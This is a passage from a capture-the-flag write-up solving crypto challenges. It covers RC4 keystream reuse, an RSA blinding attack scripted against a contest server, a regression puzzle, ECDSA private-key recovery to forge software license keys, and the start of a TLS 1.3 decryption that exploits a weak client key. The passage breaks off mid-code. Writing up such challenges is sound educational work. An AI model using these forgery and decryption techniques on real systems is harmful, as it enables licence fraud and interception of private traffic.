Therefore, if we have a plaintext/ciphertext pair $C_1, P_1$, we can recover $K = C_1 \oplus P_1$. 

Now we can decrypt any ciphertext $C_2$ as $P_2 = C_2 \oplus K = C_2 \oplus C_1 \oplus P_1$. This solves the problem. 

```python
from Crypto.Cipher import AES, PKCS1_OAEP, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long, isPrime, getPrime, GCD
from tqdm import tqdm
from pwn import *
from sage.all import *
import gmpy2, pickle, itertools, sys, json, hashlib, os, math, time, base64, binascii, string, re, struct, datetime, subprocess
import numpy as np
import random as rand
import multiprocessing as mp
from base64 import b64encode, b64decode
from sage.modules.free_module_integer import IntegerLattice
from ecdsa import ecdsa

def bytexor(a, b):
	assert len(a) == len(b)
	return bytes(x ^ y for x, y in zip(a, b))

msg = b"RC4 is a Stream Cipher, which is very simple and fast."

res1 = '634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8'
res2 = '624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb'

res1 = binascii.unhexlify(res1)
res2 = binascii.unhexlify(res2)

msg = msg[:48]
res1 = res1[:48]

flag = bytexor(msg, res1)
flag = bytexor(flag, res2)

print(flag)
```

flag : ``SCTF{B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c}``

## RSA 101

This is a classical "blinding attack" on RSA. 

If we want a signature of $m$ but cannot directly sign $m$, we can work around.

Take $m' = 2^e m$. Then, $c' \equiv (m')^d \equiv 2 m^d \pmod{n}$.

Therefore, we can use modular inverse to get $m^d \equiv 2^{-1} c' \pmod{n}$.

We now have $m^d \pmod{n}$, which is the signature we wanted. 

```python
from Crypto.Cipher import AES, PKCS1_OAEP, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long, isPrime, getPrime, GCD
from tqdm import tqdm
from pwn import *
from sage.all import *
import gmpy2, pickle, itertools, sys, json, hashlib, os, math, time, base64, binascii, string, re, struct, datetime, subprocess
import numpy as np
import random as rand
import multiprocessing as mp
from base64 import b64encode, b64decode
from sage.modules.free_module_integer import IntegerLattice
from ecdsa import ecdsa

r = remote('rsa101.sstf.site', 1104)

r.recvline()

n = int(r.recvline().split()[-1].decode(), 16)

print(n)

e = int(r.recvline().split()[-1].decode(), 16)

print(e)

for i in range(6):
    print(r.recvline())

target = b"cat flag"

workaround = (bytes_to_long(target) * (2 ** e)) % n
workaround = long_to_bytes(workaround)

sender = b64encode(workaround)

r.sendline(b"2")

r.sendline(sender)

cc = r.recvline().split()[-1]


signed = b64decode(cc)

print("signed" , signed)

val = bytes_to_long(signed)

fin = (val * inverse(2, n)) % n

for i in range(6):
    print(r.recvline())

r.sendline(b"1")


fin = b64encode(long_to_bytes(fin))

r.sendline(fin)

print(r.recvline())
print(r.recvline())
```

flag : ``SCTF{Mult1pLic4tiv3_pr0perty_of_RSA}``

## meLorean

From the keywords "Data Science" and "Linear", we guess linear regression. 

If we plot dataset of each array, we also note that there is a linear relation. 

The final part of the solution is a bit guessy - but if you print out the slopes of each linear regression result, it looks very like an ASCII value. We round each slope to an integer and convert it into a character to find the flag. 

```python
import scipy.stats 

data = [[(148, 13024.96),(236, 19034.88),(19, 1817.0),(202, 16665.88),(2, 414.12),(41, 3643.0),(67, 5801.0),(231, 19024.74),(219, 18785.34),(214, 16921.88),(207, 18117.84),(187, 15761.0),(136, 11528.0),(0, 240.0),(85, 7295.0),(6, 723.24),(223, 19498.96),(9, 927.78),(238, 19994.0),(177, 14931.0),(130, 11250.6),(69, 5967.0)]
,[(159, 10955.82),(16, 1136.8),(152, 10272.0),(121, 7867.2),(190, 13587.08),(155, 10473.0),(128, 9183.84),(191, 12627.3),(149, 10272.42),(215, 14493.0),(89, 6293.04),(101, 6855.0),(233, 15699.0),(228, 15364.0),(32, 2232.0),(33, 2299.0),(1, 155.0),(81, 5294.4),(247, 16969.74),(230, 15188.04),(120, 8128.0),(243, 15714.24)]
,[(173, 14617.0),(237, 19593.14),(37, 3256.86),(55, 4705.0),(0, 88.4),(49, 3948.94),(21, 1922.96),(6, 589.0),(228, 19237.0),(27, 2353.0),(249, 21841.04),(245, 20251.7),(140, 12081.9),(149, 12096.96),(53, 4809.22),(114, 9661.0),(16, 1429.0),(141, 11690.42),(201, 16969.0),(238, 20077.0),(248, 20917.0),(138, 11443.46)]
,[(16, 1232.4),(82, 5805.0),(172, 12105.0),(150, 10565.0),(180, 12918.3),(241, 16257.6),(130, 9165.0),(74, 4930.3),(20, 1494.3),(255, 17915.0),(197, 14132.1),(198, 13368.0),(71, 5035.0),(101, 7135.0),(251, 17635.0),(220, 15465.0),(174, 12979.7),(113, 7815.5),(64, 4635.9),(114, 8045.0),(80, 5778.3),(47, 3220.8)]
,[(110, 13802.64),(5, 617.0),(250, 31982.08),(147, 18083.0),(9, 1175.54),(24, 2835.84),(159, 19559.0),(181, 21819.7),(243, 30488.82),(53, 6521.0),(72, 8858.0),(112, 13502.44),(71, 8735.0),(23, 2831.0),(191, 24434.8),(254, 29994.24),(44, 5738.84),(209, 25194.82),(3, 371.0),(199, 24479.0),(99, 12179.0),(146, 17600.8)]
,[(9, 926.0),(202, 16366.0),(104, 8526.0),(143, 11180.16),(180, 14606.0),(164, 13059.48),(138, 11695.84),(51, 4286.0),(205, 16938.12),(123, 9845.08),(22, 2005.32),(33, 2675.24),(223, 18767.84),(179, 14526.0),(194, 15726.0),(200, 15557.76),(72, 5966.0),(24, 2126.0),(189, 15326.0),(217, 16512.04),(12, 1189.32),(112, 8982.68)]
,[(151, 17331.0),(145, 15648.18),(7, 951.6),(183, 20979.0),(192, 22885.2),(130, 14339.52),(120, 13797.0),(220, 24693.06),(208, 24782.16),(146, 16425.78),(207, 24189.3),(83, 9579.0),(11, 1371.0),(255, 28603.26),(189, 21663.0),(14, 1713.0),(241, 27591.0),(39, 4289.22),(166, 19041.0),(195, 21900.06),(35, 4189.14),(173, 19839.0)]
,[(141, 7182.24),(221, 10746.0),(254, 12576.6),(145, 7098.0),(162, 8072.28),(54, 2566.2),(107, 5379.48),(147, 7050.12),(7, 492.96),(252, 11744.64),(180, 8953.56),(168, 8202.0),(95, 4698.0),(146, 6717.24),(27, 1434.0),(199, 9690.0),(1, 186.0),(144, 7050.0),(72, 3594.0),(5, 362.88),(220, 10698.0),(108, 5215.56)]
,[(27, 3148.08),(39, 4092.48),(116, 12925.64),(149, 15593.0),(188, 20394.4),(155, 16211.0),(122, 13068.24),(245, 24971.38),(251, 26099.0),(68, 7105.0),(193, 20125.0),(249, 25375.14),(183, 19095.0),(50, 5396.0),(83, 8795.0),(174, 17804.64),(173, 18426.3),(220, 22906.0),(199, 21572.72),(114, 11988.0),(52, 5602.0),(145, 14270.14)]
,[(158, 19279.28),(77, 8954.0),(165, 18986.0),(160, 18047.68),(124, 14884.48),(208, 23888.0),(60, 7016.0),(164, 18117.12),(201, 23090.0),(91, 10550.0),(106, 12505.2),(141, 16250.0),(223, 26109.96),(219, 24136.32),(18, 2228.0),(103, 11918.0),(225, 26342.52),(122, 13238.96),(140, 16781.44),(65, 7586.0),(200, 23435.52),(13, 1624.84)]
,[(34, 3532.0),(83, 7972.14),(49, 5248.88),(127, 12666.5),(180, 18278.0),(225, 22823.0),(162, 16460.0),(229, 23227.0),(212, 21940.2),(223, 21716.16),(232, 24000.6),(178, 17714.48),(90, 9188.0),(32, 3330.0),(143, 15413.46),(255, 25335.94),(163, 16892.22),(110, 11208.0),(1, 199.0),(211, 21409.0),(128, 13547.04),(117, 11438.4)]
,[(161, 8678.0),(244, 13077.0),(13, 834.0),(91, 4868.64),(153, 8419.08),(80, 4121.9),(216, 12056.72),(178, 9387.42),(49, 2742.0),(237, 11943.64),(142, 7671.0),(68, 3749.0),(234, 12547.0),(163, 8432.64),(23, 1391.28),(133, 7194.0),(179, 10017.28),(121, 6558.0),(115, 6240.0),(93, 4972.52),(139, 7662.24),(184, 9501.12)]
,[(236, 12636.0),(98, 5109.12),(135, 7574.32),(9, 605.0),(249, 13591.5),(82, 4205.56),(24, 1456.0),(52, 2884.0),(101, 5481.0),(159, 8383.9),(129, 6965.0),(235, 12583.0),(210, 11258.0),(222, 11894.0),(106, 5860.92),(42, 2354.0),(102, 5644.68),(65, 3573.0),(191, 10866.06),(7, 489.02),(178, 9753.24),(186, 9586.56)]
,[(172, 16709.64),(56, 5147.52),(128, 12202.0),(136, 12184.28),(133, 13184.08),(222, 21132.0),(205, 19907.34),(29, 2797.0),(53, 5077.0),(140, 13342.0),(80, 7794.84),(188, 17902.0),(168, 16002.0),(167, 15270.72),(39, 3971.82),(131, 11987.52),(7, 707.0),(134, 12516.56),(162, 15432.0),(92, 8606.36),(91, 8687.0),(198, 18474.96)]
,[(250, 19107.92),(64, 4795.0),(103, 7642.0),(132, 9759.0),(252, 18519.0),(78, 5817.0),(15, 1218.0),(80, 5843.74),(52, 4075.76),(212, 14663.06),(155, 11666.76),(234, 16516.8),(95, 7058.0),(152, 10994.62),(117, 8837.28),(101, 7046.24),(184, 13826.1),(177, 12783.12),(7, 634.0),(151, 11146.0),(156, 11971.44),(62, 4649.0)]
,[(128, 14229.0),(94, 9859.66),(87, 10107.76),(251, 26648.64),(52, 5986.38),(216, 23430.82),(221, 25437.36),(63, 7079.0),(222, 24569.0),(137, 14610.24),(115, 13054.98),(66, 7260.82),(134, 15186.78),(224, 24789.0),(203, 22479.0),(245, 27099.0),(39, 4439.0),(93, 10379.0),(225, 24899.0),(149, 16208.22),(205, 24060.94),(69, 7739.0)]
,[(206, 19714.0),(183, 17529.0),(31, 3089.0),(115, 10847.62),(140, 13444.0),(252, 22638.96),(203, 20206.16),(129, 11655.06),(181, 17339.0),(174, 16340.52),(170, 16945.76),(186, 17457.72),(187, 17909.0),(40, 3865.12),(37, 3659.0),(255, 24369.0),(232, 23071.36),(35, 3469.0),(192, 19119.36),(141, 13268.22),(0, 146.88),(60, 5844.0)]
,[(200, 16475.0),(177, 14589.0),(191, 16366.48),(31, 2617.0),(125, 10531.5),(17, 1469.0),(56, 4667.0),(6, 544.32),(87, 7353.18),(157, 12172.06),(33, 2836.62),(176, 14507.0),(106, 9293.02),(242, 19919.0),(4, 403.0),(26, 2207.0),(169, 13933.0),(46, 3770.06),(127, 10908.56),(23, 1882.56),(126, 10615.14),(95, 7707.7)]
,[(196, 10456.02),(149, 7854.0),(32, 1924.74),(146, 7392.96),(144, 7599.0),(57, 2972.28),(227, 11832.0),(153, 8058.0),(61, 3567.96),(126, 6681.0),(71, 4031.04),(2, 349.86),(115, 6120.0),(28, 1683.0),(86, 4733.82),(169, 8696.52),(222, 11577.0),(33, 1899.24),(44, 2598.96),(241, 12546.0),(74, 4190.16),(159, 8364.0)]
,[(32, 3539.12),(230, 23797.0),(219, 23570.56),(229, 23220.12),(216, 22802.1),(218, 22109.78),(80, 8680.88),(251, 25960.0),(128, 13291.0),(121, 12318.6),(133, 13806.0),(253, 26166.0),(122, 12673.0),(136, 13832.7),(105, 10922.0),(31, 3300.0),(70, 7463.34),(144, 14341.44),(182, 18853.0),(123, 12009.44),(111, 11540.0),(16, 1649.7)]
,[(235, 27034.0),(125, 14494.0),(204, 23500.0),(182, 19732.48),(197, 22702.0),(151, 17108.84),(107, 12442.0),(4, 686.0),(220, 25830.48),(131, 14570.88),(173, 19966.0),(61, 7198.0),(56, 6628.0),(216, 23873.28),(176, 21526.48),(109, 12670.0),(67, 8039.64),(251, 28280.84),(211, 25269.92),(72, 8282.96),(156, 18749.12),(101, 11758.0)]
,[(247, 12712.0),(233, 11518.08),(218, 11233.0),(55, 2920.0),(185, 9550.0),(189, 9754.0),(255, 13382.4),(222, 10979.52),(231, 12133.92),(204, 10519.0),(212, 11582.62),(176, 9091.0),(68, 3583.0),(53, 2818.0),(243, 12758.16),(246, 12407.78),(155, 8340.8),(112, 5593.92),(135, 7000.0),(73, 3607.72),(121, 6411.72),(173, 8759.24)]
,[(98, 11699.4),(101, 11815.0),(25, 3136.5),(135, 15725.0),(75, 8825.0),(3, 512.3),(96, 11464.8),(74, 8710.0),(30, 3650.0),(243, 28145.0),(73, 8938.8),(32, 3724.8),(204, 24606.4),(251, 28483.7),(122, 14230.0),(145, 16875.0),(174, 20614.2),(200, 22736.0),(111, 13483.6),(53, 6295.0),(255, 29525.0),(47, 5268.7)]
,[(7, 1063.18),(118, 13768.0),(249, 28833.0),(163, 18185.28),(254, 29996.16),(116, 13267.24),(154, 17908.0),(17, 2066.88),(89, 10850.32),(21, 2560.74),(86, 10491.52),(238, 27568.0),(62, 7767.68),(156, 17775.24),(95, 11123.0),(75, 8646.54),(229, 26533.0),(113, 13193.0),(80, 9398.0),(146, 16648.24),(226, 26188.0),(153, 17793.0)]
,[(39, 5104.0),(124, 15729.0),(80, 10229.0),(122, 14550.26),(168, 21229.0),(159, 20104.0),(52, 6729.0),(16, 2095.26),(7, 1148.16),(99, 12604.0),(43, 5828.16),(35, 4511.92),(115, 14604.0),(236, 29134.42),(51, 6736.08),(176, 22229.0),(255, 32104.0),(6, 939.84),(200, 25733.58),(138, 17129.42),(143, 18828.16),(146, 18109.42)]
]

flag = ''

for i in range(len(data)):
    xs = []
    ys = []
    for u, v in data[i]:
        xs.append(u)
        ys.append(v)
    res = scipy.stats.linregress(xs, ys)
    flag += chr(int(res.slope + 0.5))

print(flag)
```

flag : ``SCTF{Pr0gre55_In_R3gr3ss}``

## license

## Step 1 

We reverse engineer the given file. This was the result.

```python
import binascii
import hashlib

def int_to_bytes(x):
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')

def base32_decode(x):
    B = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    b = ""
    for i in x:
        b += "{0:05b}".format(B.find(i))
    return int_to_bytes(int(b, 2))

k1 = base32_decode("BHAWBGQ5-MB4IUR5V-26YFXZSW-MSHEVTDN-GZB4ED2N-KDHX7A5I".replace("-", ""))
# k1 = base32_decode("BJUWBPYH-MCVFRYIZ-ZV45N5EU-D5HL6K6H-6N4VCS6X-BIUQSUTR".replace("-", ""))

assert(k1[0] ^ k1[7] == k1[28] and k1[1] ^ k1[3] == k1[12])

buf = b""

# just encode hex
B = b"0123456789ABCDEF"
for i in k1[6:]:
    buf += bytes([B[i >> 4]])
    buf += bytes([B[i & 0xF]])

key = EC_KEY_new_by_curve_name(409)
x = 4910017285067243285659645658183706496882752243738091681795
y = 894613538273475752824630788065081050497548342550540448591
EC_KEY_set_public_key_affine_coordinates(key, x, y)

sig = ECDSA_SIG_new()

r = 5241427081939067204984227503904086701023032271828334909509
s = int(buf, 16)

ECDSA_SIG_set0(sig, r, s)
dgst = hashlib.sha1(bytes(k1[:6])).digest()
ret = ECDSA_do_verify(dgst, 20, sig, key)

assert(ret == 1)

# unix time
expir_time = (k1[2] << 24) | (k1[3] << 16) | (k1[4] << 8) | k1[5]

# compare with current time
if not_expir(expir_time):
    hsh = hashlib.sha256(k1[:30]).digest()
    xor = [0x9C, 0xA2, 0x53, 0xC7, 0xC9, 0xBA, 0xA7, 0x7A, 0x2F, 0x93, 0xE5, 0xB1, 0xC2, 0xAD, 0xE8, 0x01, 0x0F, 0x2B, 0xE4, 0x5F, 0x9E, 0xCA, 0xA8, 0x9A, 0xA4, 0xAB, 0xC9, 0x53, 0x58, 0x30, 0xF2, 0x95]
    ans = []
    for i in range(32):
        ans.append(hsh[i] ^ xor[i])
    print(bytes(ans))
```

## Step 2 

We make the code self contained. Some notes here - 

  - curve name 409 corresponds to SECP192R1
  - the other ECDSA functions have trivial meanings 

Now we can fix the code to 

```python
p = (1 << 192) - (1 << 64) - 1
a = p - 3
b = 0x64210519E59C80E70FA7E9AB72243049FEB8DEECC146B9B1

E = EllipticCurve(GF(p), [a, b])
n = E.order()

Gx = 0x188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012
Gy = 0x07192B95FFC8DA78631011ED6B24CDD573F977A11E794811

def int_to_bytes(x):
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')

def base32_decode(x):
    B = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    b = ""
    for i in x:
        b += "{0:05b}".format(B.find(i))
    return int_to_bytes(int(b, 2))

def verify(dgst, sig, PK):
    z = bytes_to_long(dgst)
    r, s = sig
    u_1 = (z * inverse(s, n)) % n
    u_2 = (r * inverse(s, n)) % n
    GG = u_1 * E(Gx, Gy) + u_2 * PK
    cc = int(GG.xy()[0])
    assert cc == r


k1 = base32_decode("BHAWBGQ5-MB4IUR5V-26YFXZSW-MSHEVTDN-GZB4ED2N-KDHX7A5I".replace("-", ""))
k1 = base32_decode("BJUWBPYH-MCVFRYIZ-ZV45N5EU-D5HL6K6H-6N4VCS6X-BIUQSUTR".replace("-", ""))

assert(k1[0] ^ k1[7] == k1[28] and k1[1] ^ k1[3] == k1[12])

print(k1)

buf = b""
B = b"0123456789ABCDEF"
for i in k1[6:]:
    buf += bytes([B[i >> 4]])
    buf += bytes([B[i & 0xF]])


x = 4910017285067243285659645658183706496882752243738091681795
y = 894613538273475752824630788065081050497548342550540448591
PK = E(x, y)

r = 5241427081939067204984227503904086701023032271828334909509
s = int(buf, 16)

dgst = hashlib.sha1(bytes(k1[:6])).digest()
verify(dgst, (r, s), PK)

expir_time = (k1[2] << 24) | (k1[3] << 16) | (k1[4] << 8) | k1[5]


if expir_time > 1629123226:
    hsh = hashlib.sha256(k1[:30]).digest()
    xor = [0x9C, 0xA2, 0x53, 0xC7, 0xC9, 0xBA, 0xA7, 0x7A, 0x2F, 0x93, 0xE5, 0xB1, 0xC2, 0xAD, 0xE8, 0x01, 0x0F, 0x2B, 0xE4, 0x5F, 0x9E, 0xCA, 0xA8, 0x9A, 0xA4, 0xAB, 0xC9, 0x53, 0x58, 0x30, 0xF2, 0x95]
    ans = []
    for i in range(32):
        ans.append(hsh[i] ^ xor[i])
    print(bytes(ans))
```

## Step 3 

We do some elliptic curve cryptography. 

The key issue here is that the signature has fixed $r$. 

Consider a signature along with the hash and public key $(z, r, s, Q)$. 

The verification algorithm lets $u_1 = zs^{-1}$, $u_2 = rs^{-1}$ and checks if $u_1 G + u_2 Q$ has $x$ coordinate $r$. 

Here, the modular inverse is taken $\pmod{n}$, where $n$ is the elliptic curve order. 

Since $r$ is same for both license keys, $u_1 G + u_2 Q$ is the same (or is additive inverse of another) for the two license keys. 

Since we know all of $z, r, s, Q$ for both license keys, we can recover the private key here. 

Indeed, if we let the first set $(z_1, r, s_1, Q)$ and the second set $(z_2, r, s_2, Q)$, we see that $(z_1/s_1) G + (r/s_1) Q = (z_2/s_2) G + (r/s_2) Q$.

We can solve this equation to get $Q = dG$ for some $d$ which we can now compute fast. 

Of course, there is a chance that the two points in the equation mentioned before are additive inverses of each other.

However, it turns out the the equality holds in this case. In conclusion, we can find the private key $d$ for the public key. 

With the private key in hand, we can compute $s$ such that $(z, r, s, Q)$ is a valid signature for any $z$. 

```python
p = (1 << 192) - (1 << 64) - 1
a = p - 3
b = 0x64210519E59C80E70FA7E9AB72243049FEB8DEECC146B9B1

E = EllipticCurve(GF(p), [a, b])
n = E.order()

Gx = 0x188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012
Gy = 0x07192B95FFC8DA78631011ED6B24CDD573F977A11E794811

G = E(Gx, Gy)

x = 4910017285067243285659645658183706496882752243738091681795
y = 894613538273475752824630788065081050497548342550540448591
PK = E(x, y)

# these are z/s, r/s values from the two keys
u11, u12 = 6208018712665992685317371884848654579228254089530446391244, 3901371225190145511686010375115837075071144129982529625516
u21, u22 = 2861418786602039821386694068852808988532492969716540836428, 5623577365242345842961574633168820564776518525420727533800

target = 4295308421698895742407195884872675142566054683881561619252
dlog = 1325031087835349138965290766193329882829064869944584756462

r = 5241427081939067204984227503904086701023032271828334909509

assert u11 * G + u12 * PK == u21 * G + u22 * PK 
# we solve this to find PK = ? * G 
# PK = (u11 - u21) / (u22 - u12) G
assert PK == dlog * G
# now note that u_11 * G + u_12 * PK = (u_11 + u_12 * dlog) * G has x coordinate r
# therefore, we set target = u_11 + u_12 * dlog = u_21 + u_22 * dlog (mod n)
assert int((target * G).xy()[0]) == r
```

## Step 4

Now we aim to finish the problem. If we fix the first 6 bytes of k1, we can find $z$ and use it to compute $s$. 

Therefore, we want to brute force the first 6 bytes, which is quite infeasible. We decrease the amount of brute force by...

Guessing! We guess that the expiration time is larger than the current time (as of the competition) and is a multiple of 3600.

This can be inferred by the fact that the two expiration time from the two keys are also a multiple of 3600. 

Also, it's reasonable that the expiration time for a license key will be in a form of X o'clock. 

We now try all expiration time that is larger than the current unix time and is a multiple of 3600. 

For a fixed expiration time, there is 2 bytes of freedom from the first two bytes of k1.

We brute force 16 bits, compute $s$, then check if all conditions (byte XOR) hold. Eventually, this finds the flag.

```python
p = (1 << 192) - (1 << 64) - 1
a = p - 3
b = 0x64210519E59C80E70FA7E9AB72243049FEB8DEECC146B9B1

E = EllipticCurve(GF(p), [a, b])
n = E.order()

Gx = 0x188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012
Gy = 0x07192B95FFC8DA78631011ED6B24CDD573F977A11E794811

G = E(Gx, Gy)

def int_to_bytes(x):
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')

def base32_decode(x):
    B = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    b = ""
    for i in x:
        b += "{0:05b}".format(B.find(i))
    return int_to_bytes(int(b, 2))

def verify(dgst, sig, PK):
    z = bytes_to_long(dgst)
    r, s = sig
    u_1 = (z * inverse(s, n)) % n
    u_2 = (r * inverse(s, n)) % n
    # print(u_1, u_2)
    GG = u_1 * G + u_2 * PK
    cc = int(GG.xy()[0])
    assert cc == r

x = 4910017285067243285659645658183706496882752243738091681795
y = 894613538273475752824630788065081050497548342550540448591
PK = E(x, y)
target = 4295308421698895742407195884872675142566054683881561619252
dlog = 1325031087835349138965290766193329882829064869944584756462

r = 5241427081939067204984227503904086701023032271828334909509

assert u11 * G + u12 * PK == u21 * G + u22 * PK
assert PK == dlog * G
assert int((target * G).xy()[0]) == r

trial = 0
tsp = 1629129600
iv = inverse(target, n)
rdlog = (r * dlog) % n 
cnt = 0

while True:
    tsp += 3600
    for i in range(256):
        for j in range(256):
            k1 = bytes([i]) + bytes([j]) + long_to_bytes(tsp)
            dgst = hashlib.sha1(bytes(k1[:6])).digest()

            s = ((bytes_to_long(dgst) + rdlog) * iv) % n 
            s_bytes = long_to_bytes(s, blocksize = 24)
            k1 += s_bytes

            if k1[0] ^ k1[7] != k1[28] or k1[1] ^ k1[3] != k1[12]:
                continue
          
            hsh = hashlib.sha256(k1[:30]).digest()
            xor = [0x9C, 0xA2, 0x53, 0xC7, 0xC9, 0xBA, 0xA7, 0x7A, 0x2F, 0x93, 0xE5, 0xB1, 0xC2, 0xAD, 0xE8, 0x01, 0x0F, 0x2B, 0xE4, 0x5F, 0x9E, 0xCA, 0xA8, 0x9A, 0xA4, 0xAB, 0xC9, 0x53, 0x58, 0x30, 0xF2, 0x95]
            ans = []
            for i in range(32):
                ans.append(hsh[i] ^ xor[i])
            ans = bytes(ans)
            if ans[:4] == b"SCTF":
                print(ans)
```

flag : ``SCTF{3ll1p71c_k3y5_4r3_5m4ll3r!}``

## DecryptTLS

# DecryptTLS Writeup

We use WireShark to analyze the PCAP. 

The first immediate thing we notice is that the Client's random is bad.

It has chosen all zero bytes as its random, which shows their poor random choice.

However, the real vulnerability is the client's public key, which is ``046b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c2964fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5``

This is exactly the base point for SECP256R1. This means that the DH secret key for the client is simply 1. 

From this, we can find the shared DH secret between the client and the server, which we are not supposed to know. 

After this, the problem reduces to "simply emulating TLS 1.3 and computing application keys", which was harder than it sounds. 

We have used the excellent implementation from https://github.com/IdoBn/tls1.3/. 

```python
from Crypto.Cipher import AES, PKCS1_OAEP, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long, isPrime, getPrime, GCD
from tqdm import tqdm
from pwn import *
from sage.all import *
import gmpy2, pickle, itertools, sys, json, hashlib, os, math, time, base64, binascii, string, re, struct, datetime, subprocess
import numpy as np
import random as rand
import multiprocessing as mp
from base64 import b64encode, b64decode
from sage.modules.free_module_integer import IntegerLattice
from ecdsa import ecdsa
import requests
import scipy.stats
import matplotlib.pyplot as plt
import abc
from dataclasses import dataclass
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF, HKDFExpand

# these are all from github!
from handshake_headers import (
     HandshakeHeader,
    HANDSHAKE_HEADER_TYPES,
    HandshakeFinishedHandshakePayload,
    NewSessionTicketHandshakePayload,
)
from server_hello import ServerHello, RecordHeader
from client_hello import ClientHello, ExtensionKeyShare, ExtensionPreSharedKey, ExtensionEarlyData
from change_cipher_suite import ChangeCipherSuite

def hsh(x):
    return hashlib.sha256(x).digest()

def xor_iv(iv, num):
    formatted_num = (b"\x00" * 4) + struct.pack(">q", num)
    return bytes([i ^ j for i, j in zip(iv, formatted_num)])

@dataclass
class HandshakeKeys:
    client_key: bytes
    client_iv: bytes
    client_handshake_traffic_secret: bytes
    server_key: bytes
    server_iv: bytes
    server_handshake_traffic_secret: bytes
    handshake_secret: bytes

@dataclass
class ApplicationKeys:
    client_key: bytes
    client_iv: bytes
    server_key: bytes
    server_iv: bytes
    master_secret: bytes

def HKDF_Expand_Label(
    key, label, context, length, backend=default_backend(), algorithm=hashes.SHA256()
):
    tmp_label = b"tls13 " + label.encode()
    hkdf_label = (
        struct.pack(">h", length)
        + struct.pack("b", len(tmp_label))
        + tmp_label
        + struct.pack("b", len(context))
        + context
    )
    return HKDFExpand(
        algorithm=algorithm, length=length, info=hkdf_label, backend=backend
    ).derive(key)

def derive(shared_secret: bytes, hello_hash: bytes):#, resumption_keys: ResumptionKeys=None):
    backend = default_backend()
    # if resumption_keys:
    #     early_secret = resumption_keys.early_secret
    # else:
    early_secret = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        info=b"\x00",
        salt=b"\x00",
        backend=backend,
    )._extract(b"\x00" * 32)
    
    empty_hash = hashlib.sha256(b"").digest()
    derived_secret = HKDF_Expand_Label(
        key=early_secret,
        algorithm=hashes.SHA256(),
        length=32,
        label="derived",
        context=empty_hash,
        backend=backend,
    )
    handshake_secret = HKDF(
        algorithm=hashes.SHA256(),
        salt=derived_secret,
        info=None,
        backend=backend,
        length=32,
    )._extract(shared_secret)
    client_handshake_traffic_secret = HKDF_Expand_Label(
        context=hello_hash,
        length=32,
        algorithm=hashes.SHA256(),
        label="c hs traffic",
        backend=backend,
        key=handshake_secret,
    )
    server_handshake_traffic_secret = HKDF_Expand_Label(
        context=hello_hash,
        algorithm=hashes.SHA256(),
        length=32,
        label="s hs traffic",
        backend=backend,
        key=handshake_secret,
    )
    client_handshake_key = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        length=16,
        context=b"",
        label="key",
        backend=backend,
        key=client_handshake_traffic_secret,
    )
    server_handshake_key = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        length=16,
        context=b"",
        label="key",
        backend=backend,
        key=server_handshake_traffic_secret,
    )
    client_handshake_iv = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        length=12,
        context=b"",
        label="iv",
        backend=backend,
        key=client_handshake_traffic_secret,
    )
    server_handshake_iv = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        length=12,
        context=b"",
        label="iv",
        backend=backend,
        key=server_handshake_traffic_secret,
    )

    return HandshakeKeys(
        client_key=client_handshake_key,
        client_iv=client_handshake_iv,
        client_handshake_traffic_secret=client_handshake_traffic_secret,
        server_key=server_handshake_key,
        server_iv=server_handshake_iv,
        server_handshake_traffic_secret=server_handshake_traffic_secret,
        handshake_secret=handshake_secret,
    )

def derive_application_keys(handshake_secret: bytes, handshake_hash: bytes):
    empty_hash = hashlib.sha256(b"").digest()
    backend = default_backend()
    derived_secret = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=handshake_secret,
        label="derived",
        context=empty_hash,
        length=32,
    )
    master_secret = HKDF(
        info=b"\x00",
        salt=derived_secret,
        length=32,
        algorithm=hashes.SHA256(),
        backend=backend,
    )._extract(b"\x00" * 32)
    client_application_traffic_secret = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=master_secret,
        label="c ap traffic",
        context=handshake_hash,
        length=32,
    )
    server_application_traffic_secret = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=master_secret,
        label="s ap traffic",
        context=handshake_hash,
        length=32,
    )
    client_application_key = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=client_application_traffic_secret,
        label="key",
        context=b"",
        length=16,
    )
    server_application_key = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=server_application_traffic_secret,
        label="key",
        context=b"",
        length=16,
    )
    client_application_iv = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=client_application_traffic_secret,
        label="iv",
        context=b"",
        length=12,
    )
    server_application_iv = HKDF_Expand_Label(
        algorithm=hashes.SHA256(),
        backend=backend,
        key=server_application_traffic_secret,
        label="iv",
        context=b"",
        length=12,
    )

    return ApplicationKeys(
        client_key=client_application_key,
        client_iv=client_application_iv,
        server_key=server_application_key,
        server_iv=server_application_iv,
